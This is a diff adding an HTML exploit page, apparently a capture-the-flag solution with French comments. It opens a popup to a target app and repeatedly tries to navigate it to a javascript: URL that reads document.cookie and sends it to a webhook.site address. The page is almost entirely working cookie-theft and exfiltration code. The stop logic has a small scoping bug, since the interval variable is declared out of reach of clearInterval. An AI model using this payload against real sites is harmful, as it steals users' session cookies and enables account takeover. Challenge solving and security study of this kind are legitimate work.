@@ -1,0 +1,76 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>exploit</title></head>
+<body>
+<script>
+console.log("PWN-START");
+
+// Le FLAG cookie est défini sur domain "10-fast-fishers-app" avec httpOnly: false
+// T1 (cette page) va ouvrir T2 vers http://10-fast-fishers-app:5000/
+// T1 va tenter de naviguer T2 vers javascript: URL pour extraire document.cookie
+
+const WEBHOOK = "https://webhook.site/b626f651-8da4-4515-ba3a-e24ba1f1d3ad";
+const target = "http://10-fast-fishers-app:5000/";
+
+let w = null;
+let n = 0;
+
+function attemptLeak() {
+  n++;
+  try {
+    // Ouvrir/réutiliser le popup
+    if (!w || w.closed) {
+      w = window.open(target, "_blank");
+      console.log("POPUP-OPENED");
+    }
+
+    // 3 variantes de navigation javascript: pour tester laquelle marche
+    const js = "javascript:{" +
+      "const c = document.cookie;" +
+      "console.log('COOKIE-VALUE:' + c);" +
+      "if(c) fetch('" + WEBHOOK + "?flag=' + encodeURIComponent(c)).catch(()=>{});" +
+      "}";
+    
+    try { 
+      w.location = js; 
+      console.log("ATTEMPT-loc");
+    } catch (e) { 
+      console.log("ATTEMPT-loc-err:" + e.message); 
+    }
+    
+    try { 
+      w.location.href = js;
+      console.log("ATTEMPT-href"); 
+    } catch (e) { 
+      console.log("ATTEMPT-href-err:" + e.message); 
+    }
+    
+    try { 
+      w.location.replace(js);
+      console.log("ATTEMPT-replace"); 
+    } catch (e) { 
+      console.log("ATTEMPT-replace-err:" + e.message); 
+    }
+
+    console.log("ATTEMPT-" + n);
+  } catch (e) {
+    console.log("ATTEMPT-ERR:" + e.message);
+  }
+
+  if (n >= 15) {
+    clearInterval(iv);
+    console.log("PWN-DONE");
+  }
+}
+
+// TIMING CRITIQUE: attendre plus longtemps avant la première tentative
+// pour que les cookies soient chargés dans T2
+setTimeout(() => {
+  console.log("STARTING-LEAK-LOOP");
+  attemptLeak();
+  const iv = setInterval(attemptLeak, 600);
+}, 3000); // 3 secondes au lieu de 1.5 = plus de temps pour charger les cookies
+
+</script>
+</body>
+</html>
